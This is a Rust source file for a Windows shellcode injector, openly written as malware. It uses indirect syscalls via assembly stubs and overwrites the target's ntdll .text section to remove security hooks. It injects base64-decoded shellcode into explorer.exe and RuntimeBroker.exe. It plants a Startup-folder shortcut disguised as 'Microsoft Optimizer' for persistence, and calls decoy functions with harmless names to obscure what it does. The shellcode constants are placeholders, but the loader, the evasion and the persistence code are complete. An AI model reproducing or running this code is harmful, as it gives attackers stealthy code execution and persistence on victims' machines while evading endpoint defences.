// main.rs

use std::mem;
use core::arch::global_asm;
use windows::{
    Win32::System::Diagnostics::ToolHelp::*,
    Win32::Foundation::*,
    Win32::System::Com::*,
    Win32::UI::Shell::*,
    core::*,
};
use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS, PROCESS_BASIC_INFORMATION, ProcessBasicInformation};
use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
use base64::{Engine as _, engine::general_purpose};

mod syscall;

global_asm!(r#"
.global asm_nt_open_process
asm_nt_open_process:
    mov eax, [rsp + 0x28]
    mov r11, [rsp + 0x30]
    mov r10, [rsp + 0x38]
    push r10
    mov r10, rcx
    jmp r11

    nop
    nop
    nop
    nop
    nop

.global asm_nt_allocate_virtual_memory
asm_nt_allocate_virtual_memory:
    mov rax, [rsp + 0x28]
    mov [rsp + 0x20], rax
    mov rax, [rsp + 0x30]
    mov [rsp + 0x28], rax
    mov eax, [rsp + 0x38]
    mov r11, [rsp + 0x40]
    mov r10, [rsp + 0x48]
    push r10
    mov r10, rcx
    jmp r11

    nop
    nop
    nop
    nop
    nop

.global asm_nt_write_virtual_memory
asm_nt_write_virtual_memory:
    mov rax, [rsp + 0x28]
    mov [rsp + 0x20], rax
    mov eax, [rsp + 0x30]
    mov r11, [rsp + 0x38]
    mov r10, [rsp + 0x40]
    push r10
    mov r10, rcx
    jmp r11

    nop
    nop
    nop
    nop
    nop

.global asm_nt_create_thread_ex
asm_nt_create_thread_ex:
    mov rax, [rsp + 0x28]
    mov [rsp + 0x20], rax
    mov rax, [rsp + 0x30]
    mov [rsp + 0x28], rax
    mov rax, [rsp + 0x38]
    mov [rsp + 0x30], rax
    mov rax, [rsp + 0x40]
    mov [rsp + 0x38], rax
    mov rax, [rsp + 0x48]
    mov [rsp + 0x40], rax
    mov rax, [rsp + 0x50]
    mov [rsp + 0x48], rax
    mov rax, [rsp + 0x58]
    mov [rsp + 0x50], rax
    mov eax, [rsp + 0x60]
    mov r11, [rsp + 0x68]
    mov r10, [rsp + 0x70]
    push r10
    mov r10, rcx
    jmp r11

    nop
    nop
    nop
    nop
    nop

.global asm_nt_close
asm_nt_close:
    mov eax, edx
    mov r11, r8
    push r9
    mov r10, rcx
    jmp r11

    nop
    nop
    nop
    nop
    nop

.global asm_nt_protect_virtual_memory
asm_nt_protect_virtual_memory:
    mov rax, [rsp + 0x28]
    mov [rsp + 0x20], rax
    mov eax, [rsp + 0x30]
    mov r11, [rsp + 0x38]
    mov r10, [rsp + 0x40]
    push r10
    mov r10, rcx
    jmp r11

    nop
    nop
    nop
    nop
    nop

.global asm_nt_read_virtual_memory
asm_nt_read_virtual_memory:
    mov rax, [rsp + 0x28]
    mov [rsp + 0x20], rax
    mov eax, [rsp + 0x30]
    mov r11, [rsp + 0x38]
    mov r10, [rsp + 0x40]
    push r10
    mov r10, rcx
    jmp r11

    nop
    nop
    nop
    nop
    nop

.global asm_nt_query_information_process
asm_nt_query_information_process:
    mov rax, [rsp + 0x28]
    mov [rsp + 0x20], rax
    mov eax, [rsp + 0x30]
    mov r11, [rsp + 0x38]
    mov r10, [rsp + 0x40]
    push r10
    mov r10, rcx
    jmp r11
"#);

extern "C" {
    fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
    fn asm_nt_allocate_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, ZeroBits: u32, RegionSize: &mut usize, AllocationType: u32, Protect: u32, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
    fn asm_nt_write_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *mut std::ffi::c_void, Buffer: *const std::ffi::c_void, NumberOfBytesToWrite: usize, NumberOfBytesWritten: &mut usize, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
    fn asm_nt_create_thread_ex(ThreadHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: *mut OBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: *mut std::ffi::c_void, Argument: *mut std::ffi::c_void, CreateFlags: u32, ZeroBits: usize, StackSize: usize, MaximumStackSize: usize, AttributeList: *mut std::ffi::c_void, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
    fn asm_nt_close(Handle: HANDLE, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
    fn asm_nt_protect_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, NumberOfBytesToProtect: &mut usize, NewProperty: u32, OldProperty: &mut u32, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
    fn asm_nt_read_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *const std::ffi::c_void, Buffer: *mut std::ffi::c_void, NumberOfBytesToRead: usize, NumberOfBytesRead: &mut usize, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
    fn asm_nt_query_information_process(ProcessHandle: HANDLE, ProcessInformationClass: u32, ProcessInformation: *mut std::ffi::c_void, ProcessInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32, t: usize, r: usize) -> NTSTATUS;
}

const SHELLCODE1: &str = "ww==";
const SHELLCODE2: &str = "ww==";
const SHELLCODE3: &str = "";

const FOLDERID_Startup: GUID = GUID::from_u128(0xB97D20BB_F46A_4C97_BA10_5E3608430854);
const CLSID_ShellLink: GUID = GUID::from_u128(0x00021401_0000_0000_C000_000000000046);

fn spawn_lnk() -> Result<()> {
    unsafe {
        CoInitializeEx(None, COINIT_APARTMENTTHREADED)?;

        let shell_link: IShellLinkW = CoCreateInstance(&CLSID_ShellLink, None, CLSCTX_INPROC_SERVER)?;

        shell_link.SetPath(w!("C:\\Windows\\System32\\cmd.exe"))?;

        shell_link.SetArguments(w!("/c microsoftupdate"))?;

        shell_link.SetDescription(w!("Microsoft Optimizer"))?;

        let persist_file: IPersistFile = shell_link.cast()?;

        let path_ptr = SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_DEFAULT, windows::Win32::Foundation::HANDLE(0))?;

        let startup_path = path_ptr.to_string().map_err(|_| Error::from(HRESULT(0x80004005u32 as i32)))?;

        CoTaskMemFree(Some(path_ptr.0 as _));

        let lnk_path = format!("{}\\echo_test.lnk", startup_path);
        let lnk_path_wide: Vec<u16> = lnk_path.encode_utf16().chain(std::iter::once(0)).collect();

        persist_file.Save(PCWSTR(lnk_path_wide.as_ptr()), true)?;

        CoUninitialize();
    }
    Ok(())
}

fn validate_system_configuration() {
    let mut buffer = [0u16; 256];
    let mut size = buffer.len() as u32;
    unsafe {
        windows_sys::Win32::System::WindowsProgramming::GetComputerNameW(buffer.as_mut_ptr(), &mut size);
        let computer_name = String::from_utf16_lossy(&buffer[..size as usize]);
        let _hash = computer_name.chars().fold(0u32, |acc, c| acc.wrapping_add(c as u32));

        size = buffer.len() as u32;
        windows_sys::Win32::System::WindowsProgramming::GetUserNameW(buffer.as_mut_ptr(), &mut size);
    }
}

fn perform_background_tasks() {
    let mut free_bytes = 0u64;
    let mut total_bytes = 0u64;
    let mut total_free = 0u64;
    unsafe {
        windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW(
            "C:\\\0".encode_utf16().collect::<Vec<u16>>().as_ptr(),
            &mut free_bytes,
            &mut total_bytes,
            &mut total_free,
        );

        let mut system_time: windows_sys::Win32::Foundation::SYSTEMTIME = mem::zeroed();
        windows_sys::Win32::System::SystemInformation::GetSystemTime(&mut system_time);
    }
}

fn collect_user_metrics() {
    let mut point: windows_sys::Win32::Foundation::POINT = unsafe { mem::zeroed() };
    unsafe {
        windows_sys::Win32::UI::WindowsAndMessaging::GetCursorPos(&mut point);
        let _dummy = point.x * point.y;
    }
}

fn perform_system_integrity_check() {
    unsafe {
        let _tick_count = windows_sys::Win32::System::SystemInformation::GetTickCount();
        let mut system_info: windows_sys::Win32::System::SystemInformation::SYSTEM_INFO = mem::zeroed();
        windows_sys::Win32::System::SystemInformation::GetSystemInfo(&mut system_info);

        let mut mem_status: windows_sys::Win32::System::SystemInformation::MEMORYSTATUSEX = mem::zeroed();
        mem_status.dwLength = mem::size_of::<windows_sys::Win32::System::SystemInformation::MEMORYSTATUSEX>() as u32;
        windows_sys::Win32::System::SystemInformation::GlobalMemoryStatusEx(&mut mem_status);
    }
}

fn maintain_background_services() {
    unsafe {
        let mut system_time: windows_sys::Win32::Foundation::SYSTEMTIME = mem::zeroed();
        windows_sys::Win32::System::SystemInformation::GetSystemTime(&mut system_time);

        let mut point: windows_sys::Win32::Foundation::POINT = mem::zeroed();
        windows_sys::Win32::UI::WindowsAndMessaging::GetCursorPos(&mut point);
    }
}

fn get_module_base_address(process_handle: HANDLE, module_name: &str, gadgets: &syscall::Gadgets) -> Option<usize> {
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { mem::zeroed() };
    let mut return_len = 0;
    let nt_query_info_syscall = syscall::get_syscall_number("NtQueryInformationProcess")?;
    let nt_read_mem_syscall = syscall::get_syscall_number("NtReadVirtualMemory")?;

    let status = unsafe {
        asm_nt_query_information_process(
            process_handle,
            ProcessBasicInformation as u32,
            &mut pbi as *mut _ as *mut _,
            mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_len,
            nt_query_info_syscall,
            gadgets.syscall_ret,
            gadgets.ret,
        )
    };

    if status != 0 { return None; }

    let peb_base = pbi.PebBaseAddress;
    let mut ldr_ptr: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut bytes_read = 0;

    unsafe {
        asm_nt_read_virtual_memory(
            process_handle,
            (peb_base as usize + 0x18) as *const _,
            &mut ldr_ptr as *mut _ as *mut _,
            mem::size_of::<*mut std::ffi::c_void>(),
            &mut bytes_read,
            nt_read_mem_syscall,
            gadgets.syscall_ret,
            gadgets.ret,
        );
    }

    let mut list_head = [0usize; 2];
    unsafe {
        asm_nt_read_virtual_memory(
            process_handle,
            (ldr_ptr as usize + 0x10) as *const _,
            list_head.as_mut_ptr() as *mut _,
            mem::size_of::<[usize; 2]>(),
            &mut bytes_read,
            nt_read_mem_syscall,
            gadgets.syscall_ret,
            gadgets.ret,
        );
    }

    let mut current_node = list_head[0];
    while current_node != (ldr_ptr as usize + 0x10) {
        let mut dll_base = 0usize;
        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                (current_node + 0x30) as *const _,
                &mut dll_base as *mut _ as *mut _,
                mem::size_of::<usize>(),
                &mut bytes_read,
                nt_read_mem_syscall,
                gadgets.syscall_ret,
                gadgets.ret,
            );
        }

        let mut base_name_ptr = 0usize;
        let mut base_name_len = 0u16;
        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                (current_node + 0x58) as *const _,
                &mut base_name_len as *mut _ as *mut _,
                2,
                &mut bytes_read,
                nt_read_mem_syscall,
                gadgets.syscall_ret,
                gadgets.ret,
            );
            asm_nt_read_virtual_memory(
                process_handle,
                (current_node + 0x60) as *const _,
                &mut base_name_ptr as *mut _ as *mut _,
                mem::size_of::<usize>(),
                &mut bytes_read,
                nt_read_mem_syscall,
                gadgets.syscall_ret,
                gadgets.ret,
            );
        }

        let mut name_bytes = vec![0u16; (base_name_len / 2) as usize];
        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                base_name_ptr as *const _,
                name_bytes.as_mut_ptr() as *mut _,
                base_name_len as usize,
                &mut bytes_read,
                nt_read_mem_syscall,
                gadgets.syscall_ret,
                gadgets.ret,
            );
        }

        let current_module_name = String::from_utf16_lossy(&name_bytes);
        if current_module_name.eq_ignore_ascii_case(module_name) {
            return Some(dll_base);
        }

        unsafe {
            asm_nt_read_virtual_memory(
                process_handle,
                current_node as *const _,
                &mut current_node as *mut _ as *mut _,
                mem::size_of::<usize>(),
                &mut bytes_read,
                nt_read_mem_syscall,
                gadgets.syscall_ret,
                gadgets.ret,
            );
        }
    }

    None
}

fn unhook_remote_ntdll(process_handle: HANDLE, remote_base: usize, gadgets: &syscall::Gadgets) {
    let ntdll_bytes = std::fs::read("C:\\Windows\\System32\\ntdll.dll").expect("Failed to read ntdll.dll");
    let dos_header = ntdll_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
    let nt_headers = unsafe { (ntdll_bytes.as_ptr() as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64 };
    let section_header = (nt_headers as usize + mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    let num_sections = unsafe { (*nt_headers).FileHeader.NumberOfSections };

    for i in 0..num_sections {
        let section = unsafe { *section_header.add(i as usize) };
        let name_bytes = &section.Name;
        let name = std::str::from_utf8(name_bytes).unwrap_or("").trim_matches('\0');

        if name == ".text" {
            let virtual_address = section.VirtualAddress as usize;
            let size_of_raw_data = section.SizeOfRawData as usize;
            let pointer_to_raw_data = section.PointerToRawData as usize;

            let clean_text = &ntdll_bytes[pointer_to_raw_data..pointer_to_raw_data + size_of_raw_data];
            let remote_text_addr = remote_base + virtual_address;

            let nt_protect_syscall = syscall::get_syscall_number("NtProtectVirtualMemory").expect("Syscall not found");
            let nt_write_syscall = syscall::get_syscall_number("NtWriteVirtualMemory").expect("Syscall not found");

            let mut old_protect = 0u32;
            let mut protect_addr = remote_text_addr as *mut std::ffi::c_void;
            let mut protect_size = size_of_raw_data;

            unsafe {
                asm_nt_protect_virtual_memory(
                    process_handle,
                    &mut protect_addr,
                    &mut protect_size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protect,
                    nt_protect_syscall,
                    gadgets.syscall_ret,
                    gadgets.ret,
                );

                let mut bytes_written = 0;
                asm_nt_write_virtual_memory(
                    process_handle,
                    remote_text_addr as *mut std::ffi::c_void,
                    clean_text.as_ptr() as *const _,
                    size_of_raw_data,
                    &mut bytes_written,
                    nt_write_syscall,
                    gadgets.syscall_ret,
                    gadgets.ret,
                );

                asm_nt_protect_virtual_memory(
                    process_handle,
                    &mut protect_addr,
                    &mut protect_size,
                    old_protect,
                    &mut old_protect,
                    nt_protect_syscall,
                    gadgets.syscall_ret,
                    gadgets.ret,
                );
            }
            break;
        }
    }
}

fn get_process_pid(target_name: &str) -> Option<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).unwrap();
        if snapshot.is_invalid() {
            return None;
        }

        let mut process_entry: PROCESSENTRY32 = mem::zeroed();
        process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut process_entry).as_bool() {
            loop {
                let end = process_entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let bytes = std::slice::from_raw_parts(process_entry.szExeFile.as_ptr() as *const u8, end);
                let process_name = String::from_utf8_lossy(bytes);
                if process_name.eq_ignore_ascii_case(target_name) {
                    CloseHandle(snapshot);
                    return Some(process_entry.th32ProcessID);
                }

                if !Process32Next(snapshot, &mut process_entry).as_bool() {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
    }
    None
}

fn enjekteet(target_name: &str, shellcode_b64: &str, gadgets: &syscall::Gadgets) -> Option<()> {
    validate_system_configuration();
    let target_pid = get_process_pid(target_name)?;
    perform_background_tasks();
    let shellcode = general_purpose::STANDARD.decode(shellcode_b64).ok()?;

    let mut process_handle: HANDLE = 0;
    let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { mem::zeroed() };
    let mut client_id: CLIENT_ID = unsafe { mem::zeroed() };
    client_id.UniqueProcess = target_pid as _;

    let nt_open_process_syscall = syscall::get_syscall_number("NtOpenProcess")?;

    let status = unsafe {
        asm_nt_open_process(
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
            nt_open_process_syscall,
            gadgets.syscall_ret,
            gadgets.ret,
        )
    };

    if status != 0 { return None; }

    collect_user_metrics();
    if let Some(ntdll_base) = get_module_base_address(process_handle, "ntdll.dll", gadgets) {
        unhook_remote_ntdll(process_handle, ntdll_base, gadgets);
    }

    perform_background_tasks();
    let mut alloc_addr: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut size = shellcode.len();
    let nt_allocate_virtual_memory_syscall = syscall::get_syscall_number("NtAllocateVirtualMemory")?;

    let status = unsafe {
        asm_nt_allocate_virtual_memory(
            process_handle,
            &mut alloc_addr,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
            nt_allocate_virtual_memory_syscall,
            gadgets.syscall_ret,
            gadgets.ret,
        )
    };

    if status != 0 {
        unsafe { asm_nt_close(process_handle, syscall::get_syscall_number("NtClose")?, gadgets.syscall_ret, gadgets.ret); }
        return None;
    }

    let mut bytes_written = 0;
    let nt_write_virtual_memory_syscall = syscall::get_syscall_number("NtWriteVirtualMemory")?;

    let status = unsafe {
        asm_nt_write_virtual_memory(
            process_handle,
            alloc_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            &mut bytes_written,
            nt_write_virtual_memory_syscall,
            gadgets.syscall_ret,
            gadgets.ret,
        )
    };

    if status != 0 {
        unsafe { asm_nt_close(process_handle, syscall::get_syscall_number("NtClose")?, gadgets.syscall_ret, gadgets.ret); }
        return None;
    }

    let mut thread_handle: HANDLE = 0;
    let nt_create_thread_ex_syscall = syscall::get_syscall_number("NtCreateThreadEx")?;

    let status = unsafe {
        asm_nt_create_thread_ex(
            &mut thread_handle,
            PROCESS_ALL_ACCESS,
            std::ptr::null_mut(),
            process_handle,
            alloc_addr,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
            nt_create_thread_ex_syscall,
            gadgets.syscall_ret,
            gadgets.ret,
        )
    };

    let nt_close_syscall = syscall::get_syscall_number("NtClose")?;
    unsafe {
        if status == 0 {
            asm_nt_close(thread_handle, nt_close_syscall, gadgets.syscall_ret, gadgets.ret);
        }
        asm_nt_close(process_handle, nt_close_syscall, gadgets.syscall_ret, gadgets.ret);
    }

    if status == 0 { Some(()) } else { None }
}

fn main() {
    validate_system_configuration();
    perform_system_integrity_check();
    let _ = spawn_lnk();
    let gadgets = syscall::get_nt_gadgets().expect("Gadgets not found");

    perform_background_tasks();
    maintain_background_services();
    enjekteet("explorer.exe", SHELLCODE1, &gadgets);

    collect_user_metrics();
    let _seed = unsafe { windows_sys::Win32::System::SystemInformation::GetTickCount64() };

    enjekteet("RuntimeBroker.exe", SHELLCODE2, &gadgets);
}
